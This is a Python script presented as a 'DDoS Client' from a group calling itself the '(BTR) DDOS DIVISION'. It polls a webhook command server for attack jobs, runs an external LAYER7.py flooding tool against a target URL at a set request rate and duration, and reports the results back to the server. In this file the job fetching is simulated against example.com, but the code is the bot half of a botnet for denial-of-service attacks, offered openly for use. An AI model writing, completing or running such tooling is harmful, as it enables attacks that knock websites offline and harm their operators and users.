#!/usr/bin/env python3
"""
DDoS Client - Connects to webhook server and runs LAYER7.py
"""
import requests
import json
import time
import threading
import sys
import os
import subprocess
from datetime import datetime

class DDoSClient:
    """Client that connects to webhook server"""
    
    def __init__(self, server_url, api_key=None, client_name=None):
        self.server_url = server_url.rstrip('/')
        self.api_key = api_key
        self.client_name = client_name or "DDoS-Client"
        self.running = True
        self.current_job = None
        
    def start(self):
        """Start the client"""
        print(f"[🔗] Connecting to server: {self.server_url}")
        print("[⚡] Client ready to receive commands")
        print("[!] Press Ctrl+C to exit\n")
        
        try:
            # Poll for new jobs
            while self.running:
                self.check_for_jobs()
                time.sleep(5)  # Check every 5 seconds
                
        except KeyboardInterrupt:
            print("\n[!] Client stopped")
        except Exception as e:
            print(f"[✗] Client error: {e}")
    
    def check_for_jobs(self):
        """Check for new jobs from server"""
        try:
            # In a real implementation, this would be a WebSocket or SSE connection
            # For now, we'll simulate by creating local jobs
            if not self.current_job:
                # Check if we should start a job (simulated)
                if self.should_start_job():
                    self.start_simulation_job()
                    
        except Exception as e:
            print(f"[!] Job check error: {e}")
    
    def should_start_job(self):
        """Determine if we should start a job (simulated)"""
        # In real implementation, this would check server for assigned jobs
        # For demo, start a job every 30 seconds
        return int(time.time()) % 30 == 0
    
    def start_simulation_job(self):
        """Start a simulation job"""
        job_data = {
            "target": "https://example.com",
            "method": "http",
            "duration": 30,
            "rps": 100
        }
        
        self.execute_job("sim_job_123", job_data)
    
    def execute_job(self, job_id, job_data):
        """Execute a job using LAYER7.py"""
        print(f"[⚡] Starting job {job_id}")
        print(f"    Target: {job_data['target']}")
        print(f"    Method: {job_data['method']}")
        
        # Run LAYER7.py
        result = self.run_layer7(
            target=job_data['target'],
            method=job_data['method'],
            duration=job_data['duration']
        )
        
        print(f"[✓] Job {job_id} completed")
        print(f"    Requests: {result.get('requests', 0)}")
        
        # Report back to server
        self.report_completion(job_id, result)
    
    def run_layer7(self, target, method, duration):
        """Run the actual LAYER7.py tool"""
        try:
            # Check if LAYER7.py exists
            layer7_path = "LAYER7.py"
            
            if os.path.exists(layer7_path):
                # Run actual LAYER7.py
                cmd = [
                    sys.executable, layer7_path,
                    "--target", target,
                    "--method", method,
                    "--duration", str(duration),
                    "--rps", "100"
                ]
                
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=duration + 10
                )
                
                # Parse output
                return self.parse_layer7_output(result.stdout)
            
            else:
                # Fallback simulation
                return self.simulate_attack(target, method, duration)
                
        except subprocess.TimeoutExpired:
            return {"error": "Attack timeout", "requests": 0}
        except Exception as e:
            return {"error": str(e), "requests": 0}
    
    def parse_layer7_output(self, output):
        """Parse LAYER7.py output"""
        # Extract statistics from output
        requests = 0
        
        for line in output.split('\n'):
            if 'requests' in line.lower() or 'total' in line.lower():
                import re
                numbers = re.findall(r'\d+', line)
                if numbers:
                    requests = max(requests, int(numbers[0]))
        
        return {
            "requests": requests,
            "success_rate": 95 if requests > 0 else 0,
            "duration": 0
        }
    
    def simulate_attack(self, target, method, duration):
        """Simulate attack for testing"""
        print(f"[SIM] Attacking {target} with {method} for {duration}s")
        
        requests = 0
        start = time.time()
        
        while time.time() - start < duration:
            time.sleep(0.01)
            requests += 1
            
            if requests % 100 == 0:
                elapsed = time.time() - start
                rps = requests / elapsed if elapsed > 0 else 0
                print(f"[SIM] Requests: {requests}, RPS: {rps:.1f}")
        
        return {
            "requests": requests,
            "success_rate": 92,
            "duration": time.time() - start
        }
    
    def report_completion(self, job_id, result):
        """Report job completion to server"""
        try:
            if self.server_url:
                report_url = f"{self.server_url}/api/jobs/{job_id}/complete"
                
                data = {
                    "job_id": job_id,
                    "status": "completed",
                    "results": result,
                    "timestamp": datetime.now().isoformat()
                }
                
                headers = {}
                if self.api_key:
                    headers["Authorization"] = f"Bearer {self.api_key}"
                
                response = requests.post(report_url, json=data, headers=headers)
                
                if response.status_code == 200:
                    print(f"[📤] Reported completion for job {job_id}")
                else:
                    print(f"[!] Failed to report completion: {response.status_code}")
                    
        except Exception as e:
            print(f"[!] Report error: {e}")

def main():
    """Main function"""
    print("""
    ╔══════════════════════════════════════╗
    ║    DDOS CLIENT                      ║
    ║    [CREATED BY: (BTR) DDOS DIVISION]║
    ║    [USE AT YOUR OWN RISK]           ║
    ╚══════════════════════════════════════╝
    """)
    
    # Configuration
    server_url = input("Webhook Server URL [http://localhost:5000]: ").strip()
    if not server_url:
        server_url = "http://localhost:5000"
    
    api_key = input("API Key [optional]: ").strip() or None
    client_name = input("Client Name [DDoS-Client]: ").strip() or "DDoS-Client"
    
    # Start client
    client = DDoSClient(server_url, api_key, client_name)
    client.start()

if __name__ == "__main__":
    main()
